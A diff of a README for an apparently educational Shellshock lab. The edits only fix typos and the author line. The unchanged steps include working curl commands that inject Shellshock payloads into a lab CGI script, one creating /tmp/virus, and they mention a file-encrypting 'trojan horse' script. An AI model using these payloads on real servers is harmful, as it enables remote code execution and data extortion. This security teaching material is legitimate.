@@ -17,7 +17,7 @@
 
 1. ---DNS Setting---<br/>
 Check for DNS settings for shellshock Attack using command ```less /etc/hosts```.<br/>
-2. ---Container Setup---.<br/>
+2. ---Container Setup---<br/>
 Go in Lab setup and open terminal See if any container is running -> ```docker container list```.<br/>
 See if any image is there -> ```docker image list```.<br/>
 If you find difficulty For help type command ```docker run --help``` For conatiner help -> ```docker container --help```.<br/>
@@ -40,7 +40,7 @@ To get user process id and pid and gpid run ```curl -e "() { echo hello; }; echo
 9. We can create a virus folder in victim using ```curl -H "ATTACK: () { echo hello; }; echo Content_type: text/plain; echo; /bin/touch /tmp/virus" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi``` using this folder we will inject our malicious python scripty to encrypt and decrypt users important files. <br/> To check for folder in victims  run ```ls/tmp``` <br/>
 10. Finally we can implement our trojan horse attack using the pyhton script uploaded in my github branch.<br/> 
 
-Close lab close container  by ```docker-compose down``` <br/>
+Close lab container  by ```docker-compose down``` <br/>
 
 - Note:  If you have any concern reach me out and if you want contribute kindly open a pull request.
 
@@ -53,5 +53,5 @@ Close lab close container  by ```docker-compose down``` <br/>
 
 ## Author
 
-- Fahad Patel - 110085698
+- Fahad Patel - Univerisity of Windsor (110085698)
 
